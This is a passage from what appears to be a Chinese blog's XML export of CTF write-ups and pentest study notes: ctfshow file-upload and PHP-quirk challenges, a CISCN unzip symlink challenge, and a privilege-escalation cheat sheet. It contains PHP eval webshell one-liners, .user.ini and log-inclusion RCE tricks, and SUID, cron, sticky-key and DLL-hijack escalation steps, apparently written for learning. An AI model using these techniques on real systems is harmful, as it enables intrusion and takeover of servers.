from ### username&#x3D;‘ xxxx - - ’ and password &#x3D; ‘#####’</p><p>注释掉后面的代码，从而绕过</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311533391.png" alt="image-20230731153300162"></p><p>message.aspx存在xss漏洞</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311541727.png" alt="image-20230731154125653"></p><p>这个留言留到admin管理系统中</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311543608.png" alt="image-20230731154322534"></p><p>附一条xss常见攻击脚本<a href="https://www.jianshu.com/p/36b3578a6629">XSS攻击常识及常见的XSS攻击脚本汇总</a>     和笼统危害<a href="https://zhuanlan.zhihu.com/p/353097872">XSS漏洞及利用</a></p><p>本地是搭建了xsstool利用工具的  admin 1234567</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202307311733681.png" alt="image-20230731173313399"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传刷题</title>
      <link href="/2023/06/06/web/web2/"/>
      <url>/2023/06/06/web/web2/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="Web151"><a href="#Web151" class="headerlink" title="Web151"></a>Web151</h2><blockquote><p>（前端验证）</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071533948.png" alt="image1"></p><blockquote><p>在前端会有一些对后缀的过滤，前端过滤就进HTML检查元素把里面的限制语句直接删掉或者改成要上传的后缀名就能上传了，最简单方法就抓包改后缀就行了</p><p>上传一个小马就能rce</p></blockquote><h3 id="Web152"><a href="#Web152" class="headerlink" title="Web152"></a>Web152</h3><blockquote><p>(后端验证）</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071551531.png" alt="image3"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071552063.png" alt="image4"></p><blockquote><p>更改content-type在HTTP协议消息头中，使用Content-Type来表示媒体类型信息。它被用来告诉服务端如何处理请求的数据，以及告诉客户端（一般是浏览器）如何解析响应的数据，比如显示图片，解析html或仅仅展示一个文本等。</p><p><a href="https://blog.csdn.net/qq_14869093/article/details/86307084">Content-Type 详解_</a></p><p>抓包后修改content-type 再发包就能绕过后端过滤</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071553673.png" alt="image5"></p><h3 id="Web153"><a href="#Web153" class="headerlink" title="Web153"></a>Web153</h3><blockquote><p>ini文件包含绕过</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071605355.png" alt="image5"></p><blockquote><p>upload文件夹能够直接访问，说明有index.php文件，所以能够用.user.ini<a href="https://blog.csdn.net/weixin_52635170/article/details/126962920">.user.ini漏洞</a></p></blockquote><blockquote><p>.user.ini中两个中的配置就是auto_prepend_file和auto_append_file。这两个配置的意思就是：我们指定一个文件（如1.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），相当于在index.php中插入一句：require(.&#x2F;1.jpg)。这两个设置的区别只是在于auto_prepend_file是在文件前插入，auto_append_file在文件最后插入。</p></blockquote><blockquote><p>利用.user.ini的前提是服务器开启了CGI或者FastCGI，并且上传文件的存储路径下有index.php可执行文件。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071708978.png" alt="image8"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071709155.png" alt="image9"></p><blockquote><p>这样index.php就包含了1.txt的马然后rce</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710997.png" alt="image10"></p><blockquote><p>也可以用日志文件包含做</p></blockquote><h3 id="Web154"><a href="#Web154" class="headerlink" title="Web154"></a>Web154</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071710482.png" alt="image11"></p><blockquote><p>过滤了”php”内容 php语言对函数名、方法名、类名大小写不敏感 使用大写 或者短标签</p></blockquote><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);？&gt; <span class="hljs-meta">&lt;?</span>PHP <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);？&gt;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>没限制就继续用.user.ini漏洞写入包含文件</p></blockquote><h3 id="Web155"><a href="#Web155" class="headerlink" title="Web155"></a>Web155</h3><blockquote><p>同上</p></blockquote><h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><blockquote><p>过滤了[]，用{}代替即可:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>&#123;cmd&#125;);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><blockquote><p>多过滤了分号，改一下即可：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;<span class="hljs-string">?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><blockquote><p>同上</p></blockquote><h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><blockquote><p>同上</p></blockquote><h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><blockquote><p>本题多过滤了括号和反引号，而且还过滤了log，日志包含也能做，用字符串拼接(php中用.来连接字符串)构造log:</p></blockquote><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&quot;/var/lo&quot;</span>.<span class="hljs-string">&quot;g/nginx/access.lo&quot;</span>.<span class="hljs-string">&quot;g&quot;</span><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><blockquote><p>这种小马在&lt;?被过滤时用</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071745551.png" alt="image20"></p><blockquote><p>然后上传.user.ini包含该文件即可：auto_append_file&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;hack.png</p></blockquote><blockquote><p>然后在UA头改为想执行的命令访问主页，最后访问&#x2F;upload，看看log里命令执行结果即可即可</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071746472.png" alt="image-20230607174625433"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php特性刷题</title>
      <link href="/2023/06/06/web/web3/"/>
      <url>/2023/06/06/web/web3/</url>
      
        <content type="html"><![CDATA[<h2 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h2><h3 id="Web89"><a href="#Web89" class="headerlink" title="Web89"></a>Web89</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000076.png" alt="image-20230607100007017"></p><blockquote><p>数组绕过原理：preg_match()只能处理字符串，当传入的subject是数组时会返回false intval（）用于获取变量的整数值。也可用于进制的转化</p></blockquote><blockquote><p>PHP 是一门弱类型语言不必向 PHP 声明该变量的数据类型。PHP 会根据变量的值，自动把变量转换为正确的数据类型。 </p></blockquote><h3 id="Web90"><a href="#Web90" class="headerlink" title="Web90"></a>Web90</h3><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071000168.png" alt="image-20230607100032127"  /><blockquote><p>字符绕过：intval()而言，如果参数是字符串，则返回字符串中第一个不是数字的字符之前的数字串所代表的整数值。如果字符串第一个是‘-’，则从第二个开始算起。如果参数是符点数，则返回他取整之后的值。</p></blockquote><blockquote><p>int intval ( mixed $var [, int $base &#x3D; 10 ] )</p></blockquote><blockquote><p>参数说明：</p></blockquote><blockquote><p>$var：要转换成 integer 的数量值。</p></blockquote><blockquote><p>$base：转化所使用的进制。</p></blockquote><blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p></blockquote><blockquote><p>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 “0” 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。</p></blockquote><h3 id="Web91"><a href="#Web91" class="headerlink" title="Web91"></a>Web91</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071518574.png" alt="image-20230607151820515"></p><blockquote><p>一个正则判断</p></blockquote><blockquote><p>去看就完事了<a href="https://blog.csdn.net/xuemoyao/article/details/8033138?ops_request_misc=%7B%22request_id%22:%22165222532616782391878742%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165222532616782391878742&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-8033138-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式全解析+正则表达式例子详解</a></p><p>m是多行匹配，i是忽略大小写</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520576.png" alt="clip_image007">匹配变量中多行开头到结尾要有php</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520696.png" alt="clip_image008">匹配变量中一行行开头到结尾要有php</p></blockquote><h3 id="Web92"><a href="#Web92" class="headerlink" title="Web92"></a>Web92</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071520853.png" alt="clip_image010"></p><blockquote><p>关于intval（）函数的用法看web90</p><p>这道题意思是num这个变量转化为八进制是4476，还是考intval的用法</p></blockquote><h3 id="Web93"><a href="#Web93" class="headerlink" title="Web93"></a>Web93</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521259.png" alt="clip_image011"></p><blockquote><p>相比上一题多了匹配正则 不能出现字母 断了16进制（0x） 8进制（0）不受影响，进制绕过</p></blockquote><h3 id="Web94"><a href="#Web94" class="headerlink" title="Web94"></a>Web94</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521144.png" alt="clip_image013"></p><blockquote><p>strpos() 函数返回字符串在另一字符串中第一次出现的位置。如果存在，返回数字，如果没有找到该字符串，则返回false.所以num值中要出现0，算一个比较函数</p></blockquote><blockquote><p>第三个判断就限制了八进制 如果num&#x3D;&#x3D;010574 strpos()返回字符串第一次出现的位置就是0，第三个判断就满足了就绕不过了</p></blockquote><blockquote><p>浮点绕过</p></blockquote><h3 id="Web95"><a href="#Web95" class="headerlink" title="Web95"></a>Web95</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521951.png" alt="clip_image015"></p><blockquote><p>Intval（）函数会将输入的数前的“空格”和“+”（有且仅有）可当成输入的数为正数，一个绕过方法</p></blockquote><h3 id="Web96"><a href="#Web96" class="headerlink" title="Web96"></a>Web96</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521040.png" alt="clip_image017"></p><blockquote><p>Highlight_file可带路径，所以变量可以是路径</p></blockquote><h3 id="Web97"><a href="#Web97" class="headerlink" title="Web97"></a>Web97</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071521079.png" alt="clip_image019"></p><blockquote><p>考察md5加密：<a href="https://blog.csdn.net/wangyuxiang946/article/details/119845182?ops_request_misc=%7B%22request_id%22:%22165261132516782184692274%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165261132516782184692274&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-119845182-null-null.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&utm_term=md5%E6%95%B0%E7%BB%84&spm=1018.2226.3001.4187"> MD5加密漏洞(MD5绕过方式-0e绕过&#x2F;数组绕过&#x2F;MD5碰撞&#x2F;MD5SQL注入)</a></p></blockquote><blockquote><p>MD5是一种散列函数,是哈希算法的一种,可以将任意长度的输入,通过散列算法变换成128位的散列值</p></blockquote><blockquote><p>MD5加密有4种绕过方式1、0e绕过1、数组绕过1、MD5碰撞1、MD5SQL注入</p></blockquote><blockquote><p>这道题需要用到&#x3D;&#x3D;&#x3D;强比较（判断内容的基础上,还会判断类型是否相同），所以不能用0e弱比较绕过，用数组绕过</p><p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p><p>null &#x3D;&#x3D;&#x3D; null 满足条件就可以绕过了</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522290.png" alt="clip_image021"></p><h3 id="Web98"><a href="#Web98" class="headerlink" title="Web98"></a>Web98</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522985.png" alt="clip_image023"></p><blockquote><p>用到了？三元运算符 即前面表达式为真，则执行：前的，反之执行：后的</p></blockquote><blockquote><p>“&#x3D;&amp;“的一个说明</p></blockquote><blockquote><p>$a &#x3D; $b; &#x2F;&#x2F;把$b赋值给$a,如果赋值之后,$b改变了,$a不变</p></blockquote><blockquote><p>$a &#x3D;&amp;$b; &#x2F;&#x2F;把$b的地址传递给$a,这时候,$a和$b都指向内存中的同一块地址,所以如果赋值后,$b改变,$a也会改变</p></blockquote><blockquote><p>如果$_GET有东西传参进去就  将$_GET方法变成$_POST方法</p></blockquote><blockquote><p>思路：随便传一个get值，不能是flag&#x3D;flag就行，并传post值HTTP_FLAG&#x3D;flag 在判断highlight_file时就能通过</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522735.png" alt="clip_image025"></p><h3 id="Web99"><a href="#Web99" class="headerlink" title="Web99"></a>Web99</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071522978.png" alt="clip_image027"></p><blockquote><p>array_push() 函数向数组尾部插入一个或多个元素。</p></blockquote><blockquote><p>array_push(<em>array,value1,value2…</em>)</p></blockquote><blockquote><p>$a&#x3D;array(“a”&#x3D;&gt;”red”,”b”&#x3D;&gt;”green”);<br> array_push($a,”blue”,”yellow”); 两种使用方式</p></blockquote><blockquote><p>如果数组</p></blockquote><blockquote><p>file_put_contents() 函数把一个字符串写入文件中。如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p></blockquote><blockquote><p>in_array — 检查数组中是否存在某个值{</p></blockquote><blockquote><p>in_array(mixed $needle, array $haystack, bool $strict &#x3D; false): bool</p></blockquote><blockquote><p>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。 }36-846的随机写入数字 有一个概率问题 到底会有什么会在allow数组中 1的可能性是最大的</p></blockquote><blockquote><p>这道题是弱比较类型所以 字符串类型绕过1.php&#x3D;&#x3D;1</p></blockquote><blockquote><p>通过post传参写入 rce</p><p>然后访问2.php就行</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523710.png" alt="clip_image029"></p><h3 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523863.png" alt="clip_image031"></p><blockquote><p>is_numeric — 检测变量是否为数字或数字字符串 </p></blockquote><blockquote><p>如果 <code>value</code> 是数字或<a href="https://www.php.net/manual/zh/language.types.numeric-strings.php">数字字符串</a>， 返回 <code>**true**</code>；否则返回 <code>**false**</code>。</p></blockquote><blockquote><p>这里是个大坑 因为赋值运算优先于逻辑判断，且赋值运算逻辑为true 所以这个$v0与后面的$v2$v3无关</p></blockquote><blockquote><p>还有$v2中不能出现； 考虑PHP语句最后一句可不加；直接闭合</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523123.png" alt="clip_image033"></p><blockquote><p>正常RCE</p></blockquote><blockquote><p>ctfshow{2d6dd5c50x2d8c980x2d4c3e0x2da10e0x2dc6b39863b5e2}</p></blockquote><blockquote><p>0x2d&#x3D;”-”</p></blockquote><blockquote><p>ctfshow{2d6dd5c5-8c98-4c3e-a10e-c6b39863b5e2}</p></blockquote><h3 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h3><blockquote><p>考点：PHP 反射机制Reflection<a href="https://www.php.net/manual/zh/class.reflectionclass.php">PHP: ReflectionClass - Manual</a></p></blockquote><blockquote><p><strong>ReflectionClass</strong> 类报告了一个类的有关信息。</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523714.png" alt="clip_image035"></p><blockquote><p>这样可以echo出asd类中的属性及其方法</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523658.png" alt="clip_image037"></p><blockquote><p>注意这次的flag值少了一位，自己猜一下</p></blockquote><h3 id="Web102"><a href="#Web102" class="headerlink" title="Web102"></a>Web102</h3><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306071523844.png" alt="clip_image039"></p><blockquote><p>substr() 函数返回字符串的一部分。substr(string,start,length)</p></blockquote><blockquote><p>call_user_func — 把第一个参数作为回调函数调用</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试提权</title>
      <link href="/2023/05/31/penetration/README/"/>
      <url>/2023/05/31/penetration/README/</url>
      
        <content type="html"><![CDATA[<h2 id="提权篇"><a href="#提权篇" class="headerlink" title="提权篇"></a>提权篇</h2><p>一切一切一切的前提是你拿到了基础权限，能rce时</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p> <a href="https://www.exploit-db.com/">内核漏洞exp网</a></p><blockquote><p>根据内核从网站上找对应的exp 在里面执行</p><p>当然，如果这个漏洞被修复过了，就再找一个，这类漏洞实战中比较少，属于高危漏洞</p></blockquote><h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a>Suid提权</h3><blockquote><p>执行赋予4xxx的可执行文件</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757864.gif" alt="img"></p><p>Echo $PATH把当前tmp（777）目录增加到环境变量</p><p>Export PATH&#x3D;.:$PATH</p><p>设置了PATH执行cat的时候会优先从当前目录下查找程序。所以4xxx的可执行文件中的cat命令会被劫持，就会转到root用户</p><p>特定SUID参数利用，工具&#x2F;手工探测后看参数是否被赋予SUID权限</p><p>Nmap，Vim，find，Bash，More，Less，Nano，cp等系统命令 在suid可执行文件中使用就会发生劫持</p></blockquote><h3 id="GNU-C-library动态链接区-ORIGIN溢出提权"><a href="#GNU-C-library动态链接区-ORIGIN溢出提权" class="headerlink" title="GNU C library动态链接区$ORIGIN溢出提权"></a>GNU C library动态链接区$ORIGIN溢出提权</h3><blockquote><p><a href="https://blog.csdn.net/qq_45555226/article/details/125686751"><strong>https://blog.csdn.net/qq_45555226&#x2F;article&#x2F;details&#x2F;125686751</strong></a></p><p><strong>&#x2F;proc&#x2F;N&#x2F;fd 包含进程相关的所有的文件描述符</strong></p><p><strong>LDPRELOAD 在所有其他对象（附加的、用户指定、ELF 共享对象）之前加载，但实际上 LDPRELOAD 并非真的是首先加载，通过利用 LDAUDIT 环境变量可以实现优先于 LD_PRELOAD 加载。</strong></p><p><strong>劫持预加载动态链接库 LD_AUDIT：</strong>LD_AUDIT&#x3D;”$ORIGIN” exec &#x2F;proc&#x2F;self&#x2F;fd&#x2F;3</p><p>大概懂了但应该不怎么懂，和suid提权有一点像</p></blockquote><h3 id="LINUX-CRON-JOBS提权"><a href="#LINUX-CRON-JOBS提权" class="headerlink" title="LINUX CRON JOBS提权"></a>LINUX CRON JOBS提权</h3><blockquote><p>大概就是利用 &#x2F;etc&#x2F;crontab文件，可以设定系统定期执行的任务。</p><p>对于crontab的一些学习</p><p>首先 vi &#x2F;etc&#x2F;crontab添加定时执行任务（需要root权限）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757868.gif" alt="img"></p><p>设定细节看链接<a href="https://blog.csdn.net/qq_41969358/article/details/87892343">https://blog.csdn.net/qq_41969358/article/details/87892343</a></p><p>注意python文件的文件格式</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757870.gif" alt="img"></p><p>如果用xftp传过去的话格式为doc 运行就会提示权限不够 所以需要修改fileformat&#x3D;unix nnd找了好久</p><p>然后因为1.py是存在tmp（777）下的  达到提权</p><p><strong><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757838.gif" alt="img"></strong></p><p><strong>给dash加上</strong></p><p><strong><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757863.gif" alt="img"></strong></p><p>在普通用户下使用dash能做到在dash中提权</p><p>Dash提权一般用于Ubuntu，主要Windows的定时系统</p></blockquote><h3 id="Lpk提权"><a href="#Lpk提权" class="headerlink" title="Lpk提权"></a>Lpk提权</h3><blockquote><p>仅用于Windows2003 和xp系统 </p></blockquote><blockquote><p>在window2003或windowxp存在开机自启应用时,例如WebMail </p><p>且该目录中存在exe和lpk.dll时,每当重启电脑,或者电脑开机时,exe执行,调用了假的lpk.dll时就会被劫持。</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306011916067.png" alt="image-20230601191622884">T00ls Lpk Sethc v4生成lpk dll文件的工具，利用这个工具就可以生成后门文件劫持exe(作用是替换sethc（粘滞键))实现提权 </p><p>可以在该软件里自定义热键来唤醒,和密码来登录</p><p>远程链接 按 shirt 五次弹出 Sethc 窗口 同时按着 ctrl a 和 b 就会弹出后门输入密码 123456就能进去里</p></blockquote><h3 id="zend-nc提权"><a href="#zend-nc提权" class="headerlink" title="zend nc提权"></a>zend nc提权</h3><blockquote><p>首先zend是服务器所使用的一个插件,在服务器重启的时候被调用</p><p>iis6.0 在启动的时候 或 收回进程重启启动的时候有人访问网站的时候就会加载 dll 文件</p><p>提权方法:</p><p>首先利用Zend_DLL_Hijacking_for_nc.exe 生成相应dll文件,</p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202306012022607.png" alt="image-20230601202221563" style="zoom:33%;" /><p>然后替换掉lib下的原dll文件,然后重启服务器,然后访问网站php网页</p><p>此时就能telnet远程登录服务器了 teletnt 192.168.0.115 4444</p><p>一般都是开防火墙的,可能这个不太行,所以一般只是在反弹shell不能用的情况下碰碰运气用的</p></blockquote><h3 id="Zend-反弹shell提权"><a href="#Zend-反弹shell提权" class="headerlink" title="Zend 反弹shell提权"></a>Zend 反弹shell提权</h3><blockquote><p>原理和前面的差不多</p><p>利用msf文件生成反弹程序（msf见<a href="https://zhuanlan.zhihu.com/p/604440914">kali msfconsole命令详解以及靶机攻破实战</a>） 然后上传至目标主机服务器内 利用zend工具将dll文件进行生成 并将原dll文件替换 并在kali攻击机上设置监听 当目标服务器有人进行php网站访问时就会被捕获 从而提权</p></blockquote><h3 id="Filezilla提权"><a href="#Filezilla提权" class="headerlink" title="Filezilla提权"></a>Filezilla提权</h3><blockquote><p>原理是利用lck端口转发工具 利用filezilla多端口远程登录 达到可以修改filezilla共享的文件夹内的文件 配合其他手段达到提权 下文就是利用cmd.exe替换sethe.exe来达到替换粘滞键提权</p><p>具体实施过程：</p><p>利用lck端口转发filezilla的14147端口至14148 然后在攻击机上用14148端口登录filezilla 从而修改登录用户或者修改所共享的目录 然后更改目录中C:\WINDOWS\system32 中的sethc.exe（粘滞）修改为cmd进行污染</p></blockquote><blockquote><p>看教程说是粘滞键的一般是sethc.exe,但是此次实验中有多个不一样的，遇到这种问题，那就开了粘滞键看进程是哪一个在执行，替换掉就行了</p></blockquote><blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757882.gif" alt="img"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305311757662.gif" alt="img"></p><p>不懂</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn初赛刷题</title>
      <link href="/2023/05/30/web/ciscn/"/>
      <url>/2023/05/30/web/ciscn/</url>
      
        <content type="html"><![CDATA[<h3 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$finfo</span> = <span class="hljs-title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">finfo_file</span>(<span class="hljs-variable">$finfo</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]) === <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>&#125;; <br></code></pre></td></tr></table></figure><blockquote><p>网站源码如上 </p><p>大概意思就是<a href="https://blog.csdn.net/weixin_46142761/article/details/121858917">$_FILES</a>的理解  上传的临时文件，然后finfo （获取文件类型），之后逻辑是 如果文件类型是zip时，那么就执行unzip 该压缩包到当前目录 </p><p>这里用到了软连接，简单来说就是zip -y 能够同时压缩该文件夹有关软连接的信息，那么如果该文件夹连接到该网站的根目录下，下次解压相同文件夹名的时候，该文件夹中的文件自然就解压到网站根目录下，那么就能够用该文件马进行一系列rce了</p></blockquote><blockquote><p>首先建立软连接</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292037773.png" alt="image-20230529203732497"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292038267.png" alt="image-20230529203805218"></p><blockquote><p>进入到文件夹中然后写一个马</p><p>马的内容是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;1&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292039403.png" alt="image-20230529203956226"></p><blockquote><p>这里用到了zip命令中的-y参数<a href="https://www.cnbugs.com/post-4092.html">zip命令详解</a></p><p>-y 是直接保存符号连接，而非该链接所指向的文件，本参数仅在UNIX之类的系统下有效；</p><p>-r 是递归处理，将指定目录下的所有文件和子目录一并处理；</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292047401.png" alt="image-20230529204737313"></p><blockquote><p>构建好两个压缩包就可以开始上传了</p><p>先上传feng1.zip再上传feng2.zip 使feng.php解压到网站根目录&#x2F;var&#x2F;www&#x2F;html</p><p>然后就可以愉快rce了</p></blockquote><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/202305292052233.png" alt="image-20230529205248147"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行刷题</title>
      <link href="/2023/05/29/web/web1/"/>
      <url>/2023/05/29/web/web1/</url>
      
